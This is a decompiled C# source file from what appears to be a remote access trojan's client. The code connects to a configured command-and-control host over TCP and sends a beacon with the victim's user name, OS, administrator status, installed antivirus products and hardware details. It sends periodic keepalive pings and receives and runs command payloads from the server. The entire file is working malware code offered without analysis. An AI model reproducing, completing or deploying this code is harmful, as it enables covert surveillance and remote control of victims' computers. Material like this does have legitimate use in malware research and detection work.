using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ns0
{
	// Token: 0x02000009 RID: 9
	public class GClass2
	{
		// Token: 0x0600001E RID: 30 RVA: 0x00004868 File Offset: 0x00002A68
		public static void smethod_0()
		{
			try
			{
				string text = GClass0.string_0.Split(new char[] { ',' })[new Random().Next(GClass0.string_0.Split(new char[] { ',' }).Length)];
				if (Class6.smethod_0(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress ipaddress in hostAddresses)
					{
						try
						{
							GClass2.smethod_1(ipaddress.ToString());
							if (GClass2.bool_0)
							{
								break;
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				else
				{
					GClass2.smethod_1(text);
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00004938 File Offset: 0x00002B38
		public static object smethod_1(string string_0)
		{
			try
			{
				GClass2.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				GClass2.long_0 = -1L;
				GClass2.byte_0 = new byte[1];
				GClass2.memoryStream_0 = new MemoryStream();
				GClass2.socket_0.ReceiveBufferSize = 51200;
				GClass2.socket_0.SendBufferSize = 51200;
				GClass2.socket_0.Connect(string_0, Conversions.ToInteger(GClass0.string_2));
				GClass0.string_1 = string_0;
				GClass2.bool_0 = true;
				GClass2.object_0 = RuntimeHelpers.GetObjectValue(new object());
				GClass2.smethod_12(Conversions.ToString(GClass2.smethod_2()));
				GClass2.bool_1 = false;
				GClass2.socket_0.BeginReceive(GClass2.byte_0, 0, GClass2.byte_0.Length, SocketFlags.None, new AsyncCallback(GClass2.smethod_10), null);
				TimerCallback timerCallback = new TimerCallback(GClass2._Lambda$__4);
				GClass2.timer_0 = new Timer(timerCallback, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				GClass2.timer_1 = new Timer(new TimerCallback(GClass2.smethod_15), null, 1, 1);
			}
			catch (Exception ex)
			{
				GClass2.bool_0 = false;
			}
			finally
			{
				GClass2.manualResetEvent_0.Set();
			}
			object obj;
			return obj;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00004AB0 File Offset: 0x00002CB0
		public static object smethod_2()
		{
			ComputerInfo computerInfo = new ComputerInfo();
			return string.Concat(new object[]
			{
				"INFO",
				GClass0.string_4,
				Class6.smethod_8(),
				GClass0.string_4,
				Environment.UserName,
				GClass0.string_4,
				computerInfo.OSFullName.Replace("Microsoft", null),
				Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ",
				Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"),
				GClass0.string_4,
				GClass0.string_5,
				GClass0.string_4,
				GClass2.smethod_3(),
				GClass0.string_4,
				GClass2.smethod_4(),
				GClass0.string_4,
				GClass2.smethod_5(),
				GClass0.string_4,
				GClass3.smethod_7(),
				GClass0.string_4,
				GClass2.smethod_8(),
				GClass0.string_4,
				GClass2.smethod_7(),
				GClass0.string_4,
				GClass2.smethod_9(),
				GClass0.string_4,
				GClass2.smethod_6()
			});
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00004C14 File Offset: 0x00002E14
		public static string smethod_3()
		{
			string text;
			try
			{
				FileInfo fileInfo = new FileInfo(Class6.string_1);
				text = fileInfo.LastWriteTime.ToString("dd/MM/yyy");
			}
			catch (Exception ex)
			{
				text = "Error";
			}
			return text;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00004C68 File Offset: 0x00002E68
		public static string smethod_4()
		{
			string text;
			try
			{
				if (Operators.CompareString(Path.GetFileName(Class6.string_1), GClass0.string_6, false) == 0)
				{
					text = "True";
				}
				else
				{
					text = "False";
				}
			}
			catch (Exception ex)
			{
				text = "Error";
			}
			return text;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00004CC4 File Offset: 0x00002EC4
		public static string smethod_5()
		{
			string text;
			try
			{
				text = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString();
			}
			catch (Exception ex)
			{
				text = "Error";
			}
			return text;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00004D18 File Offset: 0x00002F18
		public static string smethod_6()
		{
			string text;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					StringBuilder stringBuilder = new StringBuilder();
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							stringBuilder.Append(managementBaseObject["displayName"].ToString());
							stringBuilder.Append(",");
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((IDisposable)enumerator).Dispose();
						}
					}
					if (stringBuilder.ToString().Length == 0)
					{
						text = "None";
					}
					else
					{
						text = stringBuilder.ToString().Substring(0, checked(stringBuilder.Length - 1));
					}
				}
			}
			catch (Exception ex)
			{
				text = "None";
			}
			return text;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00004E10 File Offset: 0x00003010
		public static string smethod_7()
		{
			string text2;
			try
			{
				string text = string.Empty;
				ObjectQuery objectQuery = new ObjectQuery("SELECT * FROM Win32_VideoController");
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(objectQuery);
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(text, managementObject["Name"]), " "));
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				text2 = text;
			}
			catch (Exception ex)
			{
				text2 = "Error";
			}
			return text2;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00004EC0 File Offset: 0x000030C0
		public static string smethod_8()
		{
			string text;
			try
			{
				ManagementObject managementObject = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
				managementObject.Get();
				text = managementObject["Name"].ToString().Replace("(R)", "").Replace("Core(TM)", "")
					.Replace("CPU", "");
			}
			catch (Exception ex)
			{
				text = "Error";
			}
			return text;
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00004F44 File Offset: 0x00003144
		public static string smethod_9()
		{
			checked
			{
				string text2;
				try
				{
					string text = null;
					long num = (long)Math.Round(Conversion.Val(Class2.Ⴓ.Info.TotalPhysicalMemory));
					if (num > 1073741824L)
					{
						text = ((double)num / 1073741824.0).ToString();
						text = text.Remove(4, text.Length - 4) + " GB";
					}
					else if (num > 1048576L)
					{
						text = ((double)num / 1048576.0).ToString();
						text = text.Remove(4, text.Length - 4) + " MB";
					}
					text2 = text;
				}
				catch (Exception ex)
				{
					text2 = "Error";
				}
				return text2;
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00005018 File Offset: 0x00003218
		public static void smethod_10(IAsyncResult iasyncResult_0)
		{
			checked
			{
				if (GClass2.bool_0)
				{
					try
					{
						int num = GClass2.socket_0.EndReceive(iasyncResult_0);
						if (num > 0)
						{
							if (GClass2.long_0 == -1L)
							{
								if (GClass2.byte_0[0] == 0)
								{
									GClass2.long_0 = Conversions.ToLong(Class6.smethod_7(GClass2.memoryStream_0.ToArray()));
									GClass2.memoryStream_0.Dispose();
									GClass2.memoryStream_0 = new MemoryStream();
									if (GClass2.long_0 == 0L)
									{
										GClass2.long_0 = -1L;
										GClass2.socket_0.BeginReceive(GClass2.byte_0, 0, GClass2.byte_0.Length, SocketFlags.None, new AsyncCallback(GClass2.smethod_10), GClass2.socket_0);
										return;
									}
									GClass2.byte_0 = new byte[(int)(GClass2.long_0 - 1L) + 1];
								}
								else
								{
									GClass2.memoryStream_0.WriteByte(GClass2.byte_0[0]);
								}
							}
							else
							{
								GClass2.memoryStream_0.Write(GClass2.byte_0, 0, num);
								if (GClass2.memoryStream_0.Length == GClass2.long_0)
								{
									object obj = new Thread(new ParameterizedThreadStart(GClass2._Lambda$__5));
									NewLateBinding.LateCall(obj, null, "Start", new object[] { GClass2.memoryStream_0.ToArray() }, null, null, null, true);
									GClass2.long_0 = -1L;
									GClass2.memoryStream_0.Dispose();
									GClass2.memoryStream_0 = new MemoryStream();
									GClass2.byte_0 = new byte[1];
								}
								else
								{
									GClass2.byte_0 = new byte[(int)(GClass2.long_0 - GClass2.memoryStream_0.Length - 1L) + 1];
								}
							}
							GClass2.socket_0.BeginReceive(GClass2.byte_0, 0, GClass2.byte_0.Length, SocketFlags.None, new AsyncCallback(GClass2.smethod_10), GClass2.socket_0);
						}
						else
						{
							GClass2.bool_0 = false;
						}
					}
					catch (Exception ex)
					{
						GClass2.bool_0 = false;
					}
				}
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00005228 File Offset: 0x00003428
		public static void smethod_11(byte[] byte_1)
		{
			try
			{
				GClass3.smethod_0(byte_1);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x0000525C File Offset: 0x0000345C
		public static void smethod_12(string string_0)
		{
			object obj = GClass2.object_0;
			ObjectFlowControl.CheckForSyncLockOnValueType(obj);
			lock (obj)
			{
				if (GClass2.bool_0)
				{
					try
					{
						using (MemoryStream memoryStream = new MemoryStream())
						{
							byte[] array = Class6.smethod_14(Class6.smethod_6(string_0));
							byte[] array2 = Class6.smethod_6(Conversions.ToString(array.Length) + "\0");
							memoryStream.Write(array2, 0, array2.Length);
							memoryStream.Write(array, 0, array.Length);
							GClass2.socket_0.Poll(-1, SelectMode.SelectWrite);
							GClass2.socket_0.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, new AsyncCallback(GClass2.smethod_13), null);
						}
					}
					catch (Exception ex)
					{
						GClass2.bool_0 = false;
					}
				}
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00005358 File Offset: 0x00003558
		public static void smethod_13(IAsyncResult iasyncResult_0)
		{
			try
			{
				GClass2.socket_0.EndSend(iasyncResult_0);
			}
			catch (Exception ex)
			{
				GClass2.bool_0 = false;
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00005398 File Offset: 0x00003598
		public static void smethod_14()
		{
			if (GClass2.timer_0 != null)
			{
				try
				{
					GClass2.timer_0.Dispose();
					GClass2.timer_0 = null;
				}
				catch (Exception ex)
				{
				}
			}
			if (GClass2.timer_1 != null)
			{
				try
				{
					GClass2.timer_1.Dispose();
					GClass2.timer_1 = null;
				}
				catch (Exception ex2)
				{
				}
			}
			if (GClass2.memoryStream_0 != null)
			{
				try
				{
					GClass2.memoryStream_0.Close();
					GClass2.memoryStream_0.Dispose();
					GClass2.memoryStream_0 = null;
				}
				catch (Exception ex3)
				{
				}
			}
			if (GClass2.socket_0 != null)
			{
				try
				{
					GClass2.socket_0.Close();
					GClass2.socket_0.Dispose();
					GClass2.socket_0 = null;
				}
				catch (Exception ex4)
				{
				}
			}
			GC.Collect();
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00005494 File Offset: 0x00003694
		public static void smethod_15(object object_1)
		{
			checked
			{
				try
				{
					if (GClass2.bool_1 && GClass2.bool_0)
					{
						GClass2.int_0++;
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000054DC File Offset: 0x000036DC
		public static void smethod_16()
		{
			try
			{
				if (GClass2.bool_0)
				{
					GClass2.smethod_12(string.Concat(new string[]
					{
						"PING!",
						GClass0.string_4,
						Class6.smethod_5(),
						GClass0.string_4,
						Class6.string_2
					}));
					GClass2.bool_1 = true;
					GC.Collect();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000023C5 File Offset: 0x000005C5
		private static void _Lambda$__4(object object_1)
		{
			GClass2.smethod_16();
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000023CC File Offset: 0x000005CC
		private static void _Lambda$__5(byte[] byte_1)
		{
			GClass2.smethod_11((byte[])byte_1);
		}

		// Token: 0x04000011 RID: 17
		public static bool bool_0 = false;

		// Token: 0x04000012 RID: 18
		public static Socket socket_0 = null;

		// Token: 0x04000013 RID: 19
		private static long long_0 = 0L;

		// Token: 0x04000014 RID: 20
		private static byte[] byte_0;

		// Token: 0x04000015 RID: 21
		private static MemoryStream memoryStream_0 = null;

		// Token: 0x04000016 RID: 22
		private static Timer timer_0 = null;

		// Token: 0x04000017 RID: 23
		public static ManualResetEvent manualResetEvent_0 = new ManualResetEvent(false);

		// Token: 0x04000018 RID: 24
		private static object object_0 = null;

		// Token: 0x04000019 RID: 25
		public static Timer timer_1;

		// Token: 0x0400001A RID: 26
		public static int int_0;

		// Token: 0x0400001B RID: 27
		public static bool bool_1;
	}
}
